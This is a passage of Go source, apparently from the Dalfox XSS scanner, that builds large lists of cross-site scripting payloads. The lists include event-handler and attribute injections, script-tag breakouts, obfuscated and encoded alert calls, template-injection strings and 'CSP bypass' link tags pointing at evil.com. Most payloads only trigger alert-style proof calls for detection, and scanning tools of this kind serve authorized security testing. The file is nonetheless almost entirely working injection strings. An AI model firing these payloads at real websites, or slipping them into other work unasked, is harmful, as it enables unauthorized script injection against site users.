		"\"><img src=x onerror=\"crypto.subtle&&alert(DALFOX_ALERT_VALUE)\" class=dalfox>",
		"\"><svg onload=\"navigator.serviceWorker&&alert(DALFOX_ALERT_VALUE)\" class=dalfox>",
		"\"><img src=x onerror=\"WebAssembly&&alert(DALFOX_ALERT_VALUE)\" class=dalfox>",
		"\"><svg onload=\"SharedArrayBuffer&&alert(DALFOX_ALERT_VALUE)\" class=dalfox>",
		"\"><img src=x onerror=\"BigInt&&alert(DALFOX_ALERT_VALUE)\" class=dalfox>",
		"\"><svg onload=\"globalThis.alert(DALFOX_ALERT_VALUE)\" class=dalfox>",
		"\"><img src=x onerror=\"self.alert(DALFOX_ALERT_VALUE)\" class=dalfox>",
		"\"><svg onload=\"frames[0].alert(DALFOX_ALERT_VALUE)\" class=dalfox>",
		"\"><img src=x onerror=\"parent.alert(DALFOX_ALERT_VALUE)\" class=dalfox>",
		"\"><svg onload=\"top.alert(DALFOX_ALERT_VALUE)\" class=dalfox>",

		//  CSP Bypass Techniques
		"><link rel=dns-prefetch href=//evil.com onload=alert(DALFOX_ALERT_VALUE) class=dalfox>",
		"><link rel=preconnect href=//evil.com onload=alert(DALFOX_ALERT_VALUE) class=dalfox>",
		"><link rel=prefetch href=//evil.com onload=alert(DALFOX_ALERT_VALUE) class=dalfox>",
		"><link rel=preload href=//evil.com onload=alert(DALFOX_ALERT_VALUE) class=dalfox>",
		"><meta http-equiv=refresh content=0;url=javascript:alert(DALFOX_ALERT_VALUE) class=dalfox>",
		"><base href=javascript:alert(DALFOX_ALERT_VALUE)// class=dalfox>",
		"><object data=javascript:alert(DALFOX_ALERT_VALUE) class=dalfox></object>",
		"><embed src=javascript:alert(DALFOX_ALERT_VALUE) class=dalfox></embed>",
		"><form action=javascript:alert(DALFOX_ALERT_VALUE) class=dalfox><input type=submit></form>",
		"><button formaction=javascript:alert(DALFOX_ALERT_VALUE) class=dalfox>Click</button>",

		// Issue #750: Object and Embed codebase attribute bypasses
		"><object data=# codebase=javascript:alert(DALFOX_ALERT_VALUE)// class=dalfox></object>",
		"'><object data=# codebase=javascript:alert(DALFOX_ALERT_VALUE)// class=dalfox></object>",
		"><embed src=# codebase=javascript:alert(DALFOX_ALERT_VALUE)// class=dalfox></embed>",
		"'><embed src=# codebase=javascript:alert(DALFOX_ALERT_VALUE)// class=dalfox></embed>",
		"><object data=# codebase=javascript:alert(document.domain)// class=dalfox></object>",
		"'><object data=# codebase=javascript:alert(document.domain)// class=dalfox></object>",
		"><embed src=# codebase=javascript:alert(document.domain)// class=dalfox></embed>",
		"'><embed src=# codebase=javascript:alert(document.domain)// class=dalfox></embed>",
		"><object data=# codebase=javascript:alert(String.fromCharCode(88,83,83))// class=dalfox></object>",
		"'><object data=# codebase=javascript:alert(String.fromCharCode(88,83,83))// class=dalfox></object>",
		"><embed src=# codebase=javascript:alert(String.fromCharCode(88,83,83))// class=dalfox></embed>",
		"'><embed src=# codebase=javascript:alert(String.fromCharCode(88,83,83))// class=dalfox></embed>",
		"'\"><svg/class=dalfox onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f",
		"</script><svg><script/class=dalfox>alert(DALFOX_ALERT_VALUE)</script>-%26apos;",
		"'\"><iframe srcdoc=\"<input onauxclick=alert(DALFOX_ALERT_VALUE)>\" class=dalfox></iframe>",

		// not include verify payload
		"\"><svg/OnLoad=\"`${prompt``}`\">",
		"'\"><img/src/onerror=.1|alert``>",
		"'><img/src/onerror=.1|alert``>",
		"\"><img/src/onerror=.1|alert``>",
		"'\"><svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f",
		"\"><script/\"<a\"/src=data:=\".<a,[].some(confirm)>",
		"\"><script y=\"><\">/*<script* */prompt()</script",
		"<xmp><p title=\"</xmp><svg/onload=alert(DALFOX_ALERT_VALUE)>",
		"\"><d3\"<\"/onclick=\">[confirm``]\"<\">z",
		"\"><a href=\"javascript&colon;alert(DALFOX_ALERT_VALUE)\">click",
		"'><a href='javascript&colon;alert(DALFOX_ALERT_VALUE)'>click",
		"\"><iFrAme/src=jaVascRipt:alert(DALFOX_ALERT_VALUE)></iFramE>",
		"\">asd",
		"'>asd",
	}
	return payload
}

func GetHTMLPayload(ip string) []string {
	var payload []string
	payloadFunc := []string{
		"alert",
		"confirm",
		"prompt",
		"alert.bind()",
		"confirm.call()",
		"prompt.valueOf()",
		"print",
		"console.log",
		"console.error",
		"console.warn",
	}
	payloadPattern := []string{
		"<sVg/onload=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE) class=dalfox>",
		"<ScRipt class=dalfox>DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE)</script>",
		"<iframe srcdoc=\"<input onauxclick=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE)>\" class=dalfox></iframe>",
		"<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() class=dalfox>",
		"<audio controls ondurationchange=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE) id=dalfox><source src=1.mp3 type=audio/mpeg></audio>",
		"<div contextmenu=xss><p>1<menu type=context class=dalfox id=xss onshow=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE)></menu></div>",
		"<iFrAme/src=jaVascRipt:DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE) class=dalfox></iFramE>",
		"<xmp><p title=\"</xmp><svg/onload=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE) class=dalfox>",
		"<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a()>",
		"<audio controls ondurationchange=v(DALFOX_ALERT_VALUE)><source src=1.mp3 type=audio/mpeg></audio>",
		"<div contextmenu=xss><p>1<menu type=context onshow=alert(DALFOX_ALERT_VALUE)></menu></div>",
		"<iFrAme/src=jaVascRipt:DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE)></iFramE>",
		"<xmp><p title=\"</xmp><svg/onload=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE)>",
		"<sVg/onload=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE)>",
		"<ScRipt>DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE)</script>",
		"<dalfox class=dalfox>",

		// Modern HTML5 Payloads
		"<video controls oncanplay=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE) class=dalfox><source src=1.mp4></video>",
		"<canvas onwebglcontextlost=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE) class=dalfox></canvas>",
		"<dialog open onclose=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE) class=dalfox>XSS</dialog>",
		"<slot onslotchange=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE) class=dalfox></slot>",
		"<template onload=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE) class=dalfox></template>",
		"<picture onload=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE) class=dalfox><source srcset=x><img src=x></picture>",
		"<track onload=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE) class=dalfox>",
		"<source onload=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE) class=dalfox>",
		"<progress onload=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE) class=dalfox></progress>",
		"<meter onload=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE) class=dalfox></meter>",
		"<output onload=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE) class=dalfox></output>",
		"<datalist onload=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE) class=dalfox></datalist>",
		"<keygen onload=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE) class=dalfox>",
		"<summary ontoggle=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE) class=dalfox>Click</summary>",
		"<details ontoggle=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE) class=dalfox open><summary>XSS</summary></details>",

		//  Web Components & Shadow DOM
		"<custom-element onconnectedcallback=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE) class=dalfox></custom-element>",
		"<web-component onattributechangedcallback=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE) class=dalfox></web-component>",
		"<shadow-host ondisconnectedcallback=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE) class=dalfox></shadow-host>",

		//  Modern Event Handlers
		"<div onpointerrawupdate=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE) class=dalfox></div>",
		"<div ongotpointercapture=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE) class=dalfox></div>",
		"<div onlostpointercapture=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE) class=dalfox></div>",
		"<div onpointercancel=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE) class=dalfox></div>",
		"<div onanimationstart=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE) class=dalfox></div>",
		"<div onanimationend=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE) class=dalfox></div>",
		"<div onanimationiteration=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE) class=dalfox></div>",
		"<div ontransitionstart=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE) class=dalfox></div>",
		"<div ontransitionrun=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE) class=dalfox></div>",
		"<div ontransitioncancel=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE) class=dalfox></div>",
		"<div onselectionchange=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE) class=dalfox></div>",
		"<div onselectstart=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE) class=dalfox></div>",
		"<div onbeforeinput=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE) class=dalfox></div>",
		"<div oninputsourceschange=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE) class=dalfox></div>",
		"<div oncompositionstart=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE) class=dalfox></div>",
		"<div oncompositionupdate=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE) class=dalfox></div>",
		"<div oncompositionend=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE) class=dalfox></div>",
	}
	for _, p := range payloadPattern {
		if strings.Contains(p, "DALFOX_FUNC_VALUE") {
			for _, pf := range payloadFunc {
				var pt string
				pt = strings.Replace(p, "DALFOX_FUNC_VALUE", pf, -1)
				payload = append(payload, pt)
			}
		} else {
			payload = append(payload, p)
		}
	}
	if strings.Contains(ip, "comment") {
		payload = append(payload, "--><svg/onload=alert(DALFOX_ALERT_VALUE)>")
		payload = append(payload, "--><script>confirm(DALFOX_ALERT_VALUE)</script>")
		payload = append(payload, "*/prompt(DALFOX_ALERT_VALUE)/*")
	}
	return payload
}

// GetAttrPayload is is return xss
func GetAttrPayload(ip string) []string {
	payload := []string{
		"onpointerenter=prompt`DALFOX_ALERT_VALUE` class=dalfox ",
		"onmouseleave=confirm(DALFOX_ALERT_VALUE) class=dalfox ",
	}
	majorHandler := []string{
		"onload",
		"onerror",
		"onmouseover",
		"onmouseenter",
		"onmouseleave",
		"onmouseenter",
		"onmouseenter",
		"onpointerover",
		"onpointerdown",
		"onpointerenter",
		"onpointerleave",
		"onpointermove",
		"onpointerout",
		"onpointerup",
		"ontouchstart",
		"ontouchend",
		"ontouchmove",
		"ontransitionend",
		"oncontentvisibilityautostatechange",
	}
	for _, mh := range majorHandler {
		if mh == "ontransitionend" {
			mh = "id=x tabindex=1 style=\"display:block;transition:outline 1s;\" ontransitionend"
		}
		if mh == "oncontentvisibilityautostatechange" {
			mh = "style=\"display:block;content-visibility:auto;\" oncontentvisibilityautostatechange" // Style needed for trigger
		}
		payload = append(payload, mh+"=alert(DALFOX_ALERT_VALUE) class=dalfox ")
		payload = append(payload, mh+"=confirm(DALFOX_ALERT_VALUE) class=dalfox ")
		payload = append(payload, mh+"=prompt(DALFOX_ALERT_VALUE) class=dalfox ")
		payload = append(payload, mh+"=alert.call(null,DALFOX_ALERT_VALUE) class=dalfox ")
		payload = append(payload, mh+"=confirm.call(null,DALFOX_ALERT_VALUE) class=dalfox ")
		payload = append(payload, mh+"=prompt.call(null,DALFOX_ALERT_VALUE) class=dalfox ")
		payload = append(payload, mh+"=alert.apply(null,DALFOX_ALERT_VALUE) class=dalfox ")
		payload = append(payload, mh+"=confirm.apply(null,DALFOX_ALERT_VALUE) class=dalfox ")
		payload = append(payload, mh+"=prompt.apply(null,DALFOX_ALERT_VALUE) class=dalfox ")
		payload = append(payload, mh+"=print(DALFOX_ALERT_VALUE) class=dalfox ")
	}

	// set html base payloads
	hp := GetHTMLPayload("")
	for _, h := range hp {
		payload = append(payload, ">"+h)
		payload = append(payload, "\">"+h)
		payload = append(payload, "'\">"+h)
		payload = append(payload, "&#x27;>"+h)
		payload = append(payload, "&#39;>"+h)
	}

	// Set all event handler base payloads
	// However, the payload must be validated and applied.
	/*
		eh := GetEventHandlers()
		for _, e := range eh {
		payload = append(payload, e+"=alert(DALFOX_ALERT_VALUE) class=dalfox ")
		payload = append(payload, e+"=confirm(DALFOX_ALERT_VALUE) class=dalfox ")
		payload = append(payload, e+"=prompt(DALFOX_ALERT_VALUE) class=dalfox ")
		//}
	*/

	if strings.Contains(ip, "none") {
		return payload
	}
	if strings.Contains(ip, "double") {
		var tempPayload []string
		for _, v := range payload {
			tempPayload = append(tempPayload, "\""+v)
		}
		return tempPayload
	}
	if strings.Contains(ip, "single") {
		var tempPayload []string
		for _, v := range payload {
			tempPayload = append(tempPayload, "'"+v)
		}
		return tempPayload
	}
	return payload
}

func GetInJsBreakScriptPayload(ip string) []string {
	payload := []string{
		"</sCRipt><sVg/onload=alert(DALFOX_ALERT_VALUE)>",
		"</scRiPt><sVG/onload=confirm(DALFOX_ALERT_VALUE)>",
		"</sCrIpt><SVg/onload=prompt(DALFOX_ALERT_VALUE)>",
		"</sCrIpt><SVg/onload=print(DALFOX_ALERT_VALUE)>",
		"</sCriPt><ScRiPt>alert(DALFOX_ALERT_VALUE)</sCrIpt>",
		"</scRipT><sCrIpT>confirm(DALFOX_ALERT_VALUE)</SCriPt>",
		"</ScripT><ScRIpT>prompt(DALFOX_ALERT_VALUE)</scRIpT>",
		"</ScripT><ScRIpT>print(DALFOX_ALERT_VALUE)</scRIpT>",
	}
	return payload
}

func GetInJsPayload(ip string) []string {
	payload := []string{
		"alert(DALFOX_ALERT_VALUE)",
		"confirm(DALFOX_ALERT_VALUE)",
		"prompt(DALFOX_ALERT_VALUE)",
		"print(DALFOX_ALERT_VALUE)",
		"alert.call(null,DALFOX_ALERT_VALUE)",
		"confirm.call(null,DALFOX_ALERT_VALUE)",
		"prompt.call(null,DALFOX_ALERT_VALUE)",
		"alert.apply(null,[DALFOX_ALERT_VALUE])",
		"prompt.apply(null,[DALFOX_ALERT_VALUE])",
		"confirm.apply(null,[DALFOX_ALERT_VALUE])",
		"window['ale'+'rt'](window['doc'+'ument']['dom'+'ain'])",
		"this['ale'+'rt'](this['doc'+'ument']['dom'+'ain'])",
		"self[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]])",
		"globalThis[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);",
		"parent['ale'+'rt'](parent['doc'+'ument']['dom'+'ain'])",
		"top[/al/.source+/ert/.source](/XSS/.source)",
		"frames[/al/.source+/ert/.source](/XSS/.source)",
		"self[/*foo*/'prompt'/*bar*/](self[/*foo*/'document'/*bar*/]['domain'])",
		"this[/*foo*/'alert'/*bar*/](this[/*foo*/'document'/*bar*/]['domain'])",
		"this[/*foo*/'print'/*bar*/](this[/*foo*/'document'/*bar*/]['domain'])",
		"window[/*foo*/'confirm'/*bar*/](window[/*foo*/'document'/*bar*/]['domain'])",
		"{{toString().constructor.constructor('alert(DALFOX_ALERT_VALUE)')()}}",
		"{{-function(){this.alert(DALFOX_ALERT_VALUE)}()}}",
		"</sCRipt><sVg/onload=alert(DALFOX_ALERT_VALUE)>",
		"</scRiPt><sVG/onload=confirm(DALFOX_ALERT_VALUE)>",
		"</sCrIpt><SVg/onload=prompt(DALFOX_ALERT_VALUE)>",
		"</sCrIpt><SVg/onload=print(DALFOX_ALERT_VALUE)>",
		"</sCriPt><ScRiPt>alert(DALFOX_ALERT_VALUE)</sCrIpt>",
		"</scRipT><sCrIpT>confirm(DALFOX_ALERT_VALUE)</SCriPt>",
		"</ScripT><ScRIpT>prompt(DALFOX_ALERT_VALUE)</scRIpT>",
		"</ScripT><ScRIpT>print(DALFOX_ALERT_VALUE)</scRIpT>",
	}
	if strings.Contains(ip, "none") {
		var tempPayload []string
		for _, v := range payload {
			tempPayload = append(tempPayload, ";"+v+";//")
			tempPayload = append(tempPayload, ";"+v+";")
			tempPayload = append(tempPayload, v)
		}
		return tempPayload
	}
	if strings.Contains(ip, "double") {
		var tempPayload []string
		for _, v := range payload {
			tempPayload = append(tempPayload, "\"+"+v+"//")
			tempPayload = append(tempPayload, "\";"+v+"//")
			tempPayload = append(tempPayload, "\"+"+v+"+\"")
			tempPayload = append(tempPayload, "\"-"+v+"-\"")
			tempPayload = append(tempPayload, "\""+v+"\"")

			tempPayload = append(tempPayload, "\\\"+"+v+"//")
			tempPayload = append(tempPayload, "\\\";"+v+"//")
			tempPayload = append(tempPayload, "\\\"+"+v+"+\"")
			tempPayload = append(tempPayload, "\\\"-"+v+"-\"")
			tempPayload = append(tempPayload, "\\\""+v+"\"")
		}
		return tempPayload
	}
	if strings.Contains(ip, "single") {
		var tempPayload []string
		for _, v := range payload {
			tempPayload = append(tempPayload, "'+"+v+"//")
			tempPayload = append(tempPayload, "';"+v+"//")
			tempPayload = append(tempPayload, "'+"+v+"+'")
			tempPayload = append(tempPayload, "'-"+v+"-'")
			tempPayload = append(tempPayload, "'"+v+"'")

			tempPayload = append(tempPayload, "\\'+"+v+"//")
			tempPayload = append(tempPayload, "\\';"+v+"//")
			tempPayload = append(tempPayload, "\\'+"+v+"+'")
			tempPayload = append(tempPayload, "\\'-"+v+"-'")
			tempPayload = append(tempPayload, "\\'"+v+"'")
		}
		return tempPayload
	}
	if strings.Contains(ip, "backtick") {
		var tempPayload []string
		for _, v := range payload {
			tempPayload = append(tempPayload, "${"+v+"}")
		}
		return tempPayload
	}
	return payload

}

func GetDOMXSSPayload() []string {
	payload := []string{
		"<img/src/onerror=.1|alert`DALFOX_ALERT_VALUE`>",
		";alert(DALFOX_ALERT_VALUE);",
		"javascript:alert(DALFOX_ALERT_VALUE)",
	}
	return payload
}

func GetDeepDOMXSPayload() []string {
	payload := []string{
		"<svg/OnLoad=\"`${prompt`DALFOX_ALERT_VALUE`}`\">",
		"<img/src/onerror=.1|alert`DALFOX_ALERT_VALUE`>",
		"alert(DALFOX_ALERT_VALUE)",
		"prompt(DALFOX_ALERT_VALUE)",
		"confirm(DALFOX_ALERT_VALUE)",
		"print(DALFOX_ALERT_VALUE)",
		";alert(DALFOX_ALERT_VALUE);",
		"javascript:alert(DALFOX_ALERT_VALUE)",
		"java%0ascript:alert(DALFOX_ALERT_VALUE)",
		"data:text/javascript;,alert(DALFOX_ALERT_VALUE)",
		"<iMg src=a oNerrOr=alert(DALFOX_ALERT_VALUE)>",
		"\\x3ciMg src=a oNerrOr=alert(DALFOX_ALERT_VALUE)\\x3e",
		"\\74iMg src=a oNerrOr=alert(DALFOX_ALERT_VALUE)\\76",
		"\"><iMg src=a oNerrOr=alert(DALFOX_ALERT_VALUE)>",
		"\\x27\\x3E\\x3Cimg src=a oNerrOr=alert(DALFOX_ALERT_VALUE)\\x3E",
		"\\47\\76\\74img src=a oNerrOr=alert(DALFOX_ALERT_VALUE)\\76",
		"\"><iMg src=a oNerrOr=alert(DALFOX_ALERT_VALUE)>",
		"\\x22\\x3e\\x3cimg src=a oNerrOr=alert(DALFOX_ALERT_VALUE)\\x3e",
		"\\42\\76\\74img src=a oNerrOr=alert(DALFOX_ALERT_VALUE)\\76",
		"\"><iMg src=a oNerrOr=alert(DALFOX_ALERT_VALUE)>",
		"\\x27\\x3e\\x3cimg src=a oNerrOr=alert(DALFOX_ALERT_VALUE)\\x3e",
		"\\47\\76\\74img src=a oNerrOr=alert(DALFOX_ALERT_VALUE)\\76",
		"1 --><iMg src=a oNerrOr=alert(DALFOX_ALERT_VALUE)>",
		"1 --\\x3e\\x3ciMg src=a oNerrOr=alert(DALFOX_ALERT_VALUE)\\x3e",
		"1 --\\76\\74iMg src=a oNerrOr=alert(DALFOX_ALERT_VALUE)\\76",
		"]]><iMg src=a oNerrOr=alert(DALFOX_ALERT_VALUE)>",
		"]]\\x3e\\x3ciMg src=a oNerrOr=alert(DALFOX_ALERT_VALUE)\\x3e",
		"]]\\76\\74iMg src=a oNerrOr=alert(DALFOX_ALERT_VALUE)\\76",
		"</scrIpt><scrIpt>alert(DALFOX_ALERT_VALUE)</scrIpt>",
		"\\x3c/scrIpt\\x3e\\x3cscript\\x3ealert(DALFOX_ALERT_VALUE)\\x3c/scrIpt\\x3e",
		"\\74/scrIpt\\76\\74script\\76alert(DALFOX_ALERT_VALUE)\\74/scrIpt\\76",
	}
	return payload
}
